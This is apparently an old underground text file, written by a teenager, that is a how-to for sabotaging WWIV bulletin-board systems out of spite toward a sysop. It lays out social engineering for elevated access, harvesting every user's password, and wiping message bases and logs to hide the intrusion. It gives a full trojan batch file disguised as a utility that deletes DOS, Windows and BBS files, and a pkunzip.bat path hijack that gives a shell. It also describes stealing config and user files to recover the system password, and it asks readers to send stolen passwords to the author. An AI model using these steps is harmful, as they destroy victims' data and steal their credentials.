******************************************************************************
      
        
        Well Hellow everyone. I was on a local board the other day, (PD that 
is) and it was running the wowy-zowy-latest ver of WWiV! And wouldn't ya know,
the sysop was an asshole.  And since i knew him from school, i wanted to see 
how REALLY PISSED off i could make him. So i sat there and thought. and here's
what my little 16-year old Psychotic Brain came up with:
                 

                            
PART ONE:   HEA, i'll....if you give me sysop access!

        Well We all know that You can always find a little punk-ass 12-year 
old, or 15/16 running wwiv, and wanting all the little porno's he can get is
vasoline covered hands on.  So you log on one day (As NEW) and use stuff that 
semes real, like dont put PERCTOR, from 1313 Mochingbird Lane, East Jabib,NJ.
Try looking in the phone book for a nice-guy type last name, and use a friend-
ly handle like Rainbo or Chuck or Floppy Man.  Then be a typical user for a 
week.  And just out of the blue say, "hea, i have a to of porno's that i got 
the other day, and man they are hot! i'll givem to ya if you give me 255 
access!"  Then after some negotiating, the rug-rat might do it, but they'll
probly only give it to ya for a day or so. So after that, u/l a gif or 2, and 
say you'll u/l more the next day. then call back at 3-4 in the mornig, or 
any other time, but 3-4 EVERYONE is usualy asleep! 

A---->Since you know have the co-sysop access, you can hit /? at the main 
menu to see all the cool stuff you are able to do now, but my fav. is hitting 
//UE and looking at all the users info, and PW's! copy the names,handles,
last-4,and PW's to a file, u'l it to my board, and it wil all be put into my 
LAMERZ of the month file but you have to tell me the name and number of the 
bbs(or bbsS depending on if they work on other boards

B---->Delete all the mesage bases, and file bases. Erase all users, and all 
the on-line doorz. then type (from the main menu) //TE <ENTER> 95mmdd.log 
(that is that day's log file.) then hang up. and call back. (i HOPE you didn't 
erace you'r account too!) and from the main menu type //TE <ENTER> 95mmdd.log 
(Yes the same as befor!) and if you look, it will have a log of you eraseing 
all that nice stuff, so erase the evadence.  And when you get done with that 
edit the file lastcall.log and erase that too. then from the main menu type 
'/boot'.


------------------------------------------------------------------------------
PaRt 2 the trogen!  
        
        Call you'r special little person again, with another name.  And some
how, find out some kinda util he needs. Whatever it is, tell him you have a 
copy of it right here on flopy, but you have to do something now, and you can 
u/l it later.  Then when you get home, make a file called install.bat. and in 
this file you put:
@ECHO OFF
copy c:\dos\ansi.sys bbs.com
copy bbs.com data\config.dat
copy bbs.com data\users.lst
copy bbs.com bbs.exe
copy bbs.com c:\autoexec.bat
del *.bat
cd gfiles
del *.ans
del *.bbs
del *.log                      NOTE: DON'T type anything like del *.* or
cd ..                                format c:  cause that forces dos to 
cd data                              come up with a (Y/N) prompt, and then 
del *.dat                            mr dumy, wil get a little suspicious!
cd\dos
del *.exe
del *.com
del *.sys
cd\windows
del *.pif
del *.com
del *.exe
copy *.* win.com
----[STOP}----
then use these 3 files i included with this zip.
-1-> bat2exe instal.bat
-1a->that converts the install.bat to install.exe, but if you type the exe 
file you can see the chain of del's and copy's.
-2-> epw install.exe  (USE WWIV for the password!)
-2a->this encripts the file, and pw's it PW? no that'll give it away! just 
     watch!
-3-> bedit install.exe (i think that epw dosn't change it to a com. o can't 
     remember right now)
-3.1-> IN B-edit, hit tab to get to the ascii, and find the part about 
      entering the PW, and change it to BBS type (4-charecter). and that'll
      make the lamer think it is a cool util!
NOW when mr. Stroke A. Lot runs it, it compleatly FUCKS his whole system!, 
no meore dos, no more windows, no more HEAVILY NEEDED WWIV files!

------------------------------------------------------------------------------
PART 3 the archive nightmare!

        Make a file called pkunzip.bat and in it there must be only one line. 
'command' (NOT with the 2 ' tho!)
and call out friendly neighborhood masterbator's board and u/l this file.
THEN use the extract (e) and extract it. when his system wants to 'pkunzip' 
it will look in the current dir FIRST, befor it serches the path, and then
when it enters pkunzip it will execute the batch, running the command.com
(if he's not runing os/2) and droping you right into dos!

Part 3.1   the alt255!
        While in dos, make a dirs called FUCK<alt255>YOU and ASS<alt255>HOLE
        cause when he gose to erase the dirs by typing RD FUCK YOU, he cant
        cause of our friendly little nul string, the 255. AND! you can also
        make dirs like: (the _ represents a null charicter (alt255)
        _         _._          _.__         _.___         FUCK_YOU.
        __        __._         __.__        __.___        FUCK_YOU._
        ___       ___._        ___.__       ___.___       FUCK_YOU.__
        ____      ____._       ____.__      ____.___      FUCK_YOU.___
        _____     _____._      _____.__     _____.___     FUCK_YOU.!
        ______    ______._     ______.__    ______.___    FUCK_YOU.!_
        _______   _______._    _______.__   _______.___   FUCK_YOU.!__
        ________  ________._   ________.__  ________.___  FUCK_YOU._!_
        I think you get the gist of things!

Part 3.2   The DOS dir!
        While in dos, visit dome directories, like dos, and windows.
        try this:
          in dos:                       in /windows
        >cd\dos                     c:\?>cd\windows
        >del *.com                  c:\windows>del win.com
        >copy *.exe command.com     c:\windows\system>cd system
        >copy *.* sys.com                             >copy *.* ..\win.com
        >copy *.* more.com                            >del *.exe
        >copy *.* help.com                            >del *.ini
        >del c:\command.com                           >del *.386
        >copy *.* ..\command.com                      >cd ..
        >copy *.* a.TLG             c:\windows>copy *.* a.TLG
        >copy *.* b.TLG                       >del *.exe
                                              >del *.bmp
                                              >del *.com
                                              >del *.ini
        NOTE!::NEVER type >del *.*, or format c:, cause it wants a (Y/N)check
        and it will hang you out of the system.

Part 3.3   The users.lst and config.dat
        while in dos, copy the config.dat, and users.lst files to a 'free'
        file dir that the little wanker has on his system. then use the pkzip
        to add those 2 files to this one file.
        After they have been added, type exit, to get back to the bbs, and d/l
        the file you just put the users.lst and config.dat file to.
        with thest 2 files you can get the system pw, and all the info about 
        them.  And the easyist way to do this, is get a copy of WWIV from 
        some board and install it, BUT don't run anything yet, after it 
        makes the dirs and stuff go to the config.dat file that the bbs 
        you just installed. and use list or something and view it. find where
        it says SYSOP. sysop is the default sys PW. now you know where in the
        file it is located.  copy the stolen config.dat and user.lst files 
        over the new ones. use list again, and view it again.  now look where 
        you saw SYSOP befor. what it now says is the system PW on that lamerz
        board you were just on.  now run the init, and type in the system PW
        you saw in the stolen config.dat.  to avoid all problems, go to the
        modem settings, and set the com-port to 0.
        Now get out of the INIT program, and type BBS, that loads the bbs.
        it schould say a line or 2 about the guy who wrote this WWiV, then 
        a blank WFC screen.  HiT 'U' for the user edit. now you schould see
        all the users he had on his board (one per screen) and their PW's and 
        stuff.  If You get a copy of the pw's and user names to me, i'll put 
        them in my LAMERz' of the month file, and i'll note that they were all
        gotten from you. (or not if you don't want me to.)

Part 3.9  The PURE GENIOUS of it all!
              ^^^^-^^^^^^^
          While you are doing all this fun stuff in his (or her) system, the 
          sysop's log will only put down that you archived a file. not that you 
          put obcene mesages in as DiRs or that you know know all the users PW's!
          and his. Nope, he just thinks that you extracted a file.

 ------------------------------------------------------------------------------
Well There ya go. all this fine stuff will work on un-regestered or un-modded
ver. of WWIV up to V. 4.24 (the latest version out now) and it will still probly 
work on medded boardz, pending that they didn't change the command names of
//boot    //UE    //TE
and if he/she/it/whatever did change them, the trogen, AND the pkunzip.bat
things schould still work!
